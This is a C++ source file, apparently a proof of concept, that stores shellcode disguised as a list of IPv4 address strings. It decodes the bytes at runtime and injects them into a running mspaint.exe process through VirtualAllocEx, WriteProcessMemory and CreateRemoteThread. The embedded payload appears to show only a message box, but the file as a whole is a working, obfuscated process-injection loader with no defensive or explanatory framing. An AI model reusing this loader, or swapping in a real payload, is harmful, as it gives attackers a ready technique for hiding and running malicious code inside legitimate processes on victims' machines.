#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <tlhelp32.h>

int getProcessIDPaint(){

        PROCESSENTRY32 lppe;
        lppe.dwSize = sizeof(PROCESSENTRY32);
        //Take a snapshot of all existing processes
        HANDLE hSnapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        Process32First(hSnapshot,&lppe);
        BOOL notFinished = TRUE;
        while(strcmp(lppe.szExeFile, "mspaint.exe") != 0){
            //iterate throught each process,  identify MSPaint and get its pid
            notFinished = Process32Next(hSnapshot,&lppe);
            //if mspaint is not open
            if (!notFinished){
                printf("MSPaint is not open, waiting...\n");
                Sleep(1000); // Wait for 1 second before checking again
                hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            }
        }

        //return the process id
        int pid = lppe.th32ProcessID;
        printf("pid is %d\n", pid);
        return pid;
}

std::vector<unsigned char> ipAddressesToBytes(const std::vector<std::string>& ipAddresses) {
	std::vector<unsigned char> byteArray;

	for (const auto& ip : ipAddresses) {
		std::stringstream ss(ip);
		std::string segment;
		while (std::getline(ss, segment, '.')) {
			int byteValue = std::stoi(segment);
			byteArray.push_back(static_cast<unsigned char>(byteValue));
		}
	}

	return byteArray;
}
int main(int argc, char* argv[]) {



    DWORD pid = getProcessIDPaint();
    if (pid == -1){
        printf("Error injecting\n");
        return -1;
    }

    
    std::vector<std::string> ip_shellcode = {
"252.72.129.228",
"240.255.255.255",
"232.208.0.0",
"0.65.81.65",
"80.82.81.86",
"72.49.210.101",
"72.139.82.96",
"62.72.139.82",
"24.62.72.139",
"82.32.62.72",
"139.114.80.62",
"72.15.183.74",
"74.77.49.201",
"72.49.192.172",
"60.97.124.2",
"44.32.65.193",
"201.13.65.1",
"193.226.237.82",
"65.81.62.72",
"139.82.32.62",
"139.66.60.72",
"1.208.62.139",
"128.136.0.0",
"0.72.133.192",
"116.111.72.1",
"208.80.62.139",
"72.24.62.68",
"139.64.32.73",
"1.208.227.92",
"72.255.201.62",
"65.139.52.136",
"72.1.214.77",
"49.201.72.49",
"192.172.65.193",
"201.13.65.1",
"193.56.224.117",
"241.62.76.3",
"76.36.8.69",
"57.209.117.214",
"88.62.68.139",
"64.36.73.1",
"208.102.62.65",
"139.12.72.62",
"68.139.64.28",
"73.1.208.62",
"65.139.4.136",
"72.1.208.65",
"88.65.88.94",
"89.90.65.88",
"65.89.65.90",
"72.131.236.32",
"65.82.255.224",
"88.65.89.90",
"62.72.139.18",
"233.73.255.255",
"255.93.62.72",
"141.141.63.1",
"0.0.65.186",
"76.119.38.7",
"255.213.73.199",
"193.0.0.0",
"0.62.72.141",
"149.14.1.0",
"0.62.76.141",
"133.52.1.0",
"0.72.49.201",
"65.186.69.131",
"86.7.255.213",
"72.49.201.65",
"186.240.181.162",
"86.255.213.72",
"101.108.108.111",
"32.116.104.105",
"115.32.105.115",
"32.97.110.32",
"73.80.86.52",
"32.101.110.99",
"111.100.101.100",
"32.109.97.108",
"119.97.114.101",
"0.77.101.115",
"115.97.103.101",
"66.111.120.0",
"117.115.101.114",
"51.50.46.100",
};

auto shellcode_bytes = ipAddressesToBytes(ip_shellcode);
size_t byteArraySize = shellcode_bytes.size();


unsigned char shellcode[shellcode_bytes.size()];
    for (int i = 0 ; i< shellcode_bytes.size(); i++){
        shellcode[i] = shellcode_bytes[i];
    }


    //Open the mspaint process 
    HANDLE hprocess =  OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
    printf("Process opened\n");


    //reserve memory inside the mspaint process
    LPVOID allocated_mem =  VirtualAllocEx(hprocess,0,byteArraySize,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL){
        printf("Memory Allocation failed\n");
        return 0;
    }
    printf("Memory allocated at %p\n",allocated_mem);


    //write on memory
    WriteProcessMemory(hprocess,allocated_mem ,shellcode  ,byteArraySize,NULL);
    printf("Shellcode written on memory\n");

    //create thread
    HANDLE hthread = CreateRemoteThread(hprocess,NULL, byteArraySize,(LPTHREAD_START_ROUTINE) allocated_mem, NULL,0,NULL);

    //close Handle
    CloseHandle(hthread);
    CloseHandle(hprocess);




}